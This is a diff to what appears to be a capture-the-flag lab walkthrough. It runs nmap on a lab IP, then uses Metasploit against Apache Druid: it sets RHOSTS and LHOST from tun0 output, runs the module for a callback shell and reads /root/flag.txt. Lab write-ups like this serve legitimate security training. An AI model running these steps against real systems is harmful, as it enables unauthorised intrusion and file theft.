@@ -24,8 +24,20 @@ nmap -sV 10.129.51.173
 
 msfconsole -q
 search apache druid
-show payloads
 set RHOSTS 10.129.51.173
-set RPORT 8081
-set TARGET 1
-set LHOST 
+ifconfig tun0
+# [*] exec: ifconfig tun0
+
+# tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+#         inet 10.10.14.6  netmask 255.255.254.0  destination 10.10.14.6
+#         inet6 fe80::f398:67b9:654b:d6fd  prefixlen 64  scopeid 0x20<link>
+#         inet6 dead:beef:2::1004  prefixlen 64  scopeid 0x0<global>
+#         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+#         RX packets 2599  bytes 140581 (137.2 KiB)
+#         RX errors 0  dropped 0  overruns 0  frame 0
+#         TX packets 3571  bytes 3273568 (3.1 MiB)
+#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+set LHOST 10.10.14.6
+run
+search -f flag.txt
+cat /root/flag.txt
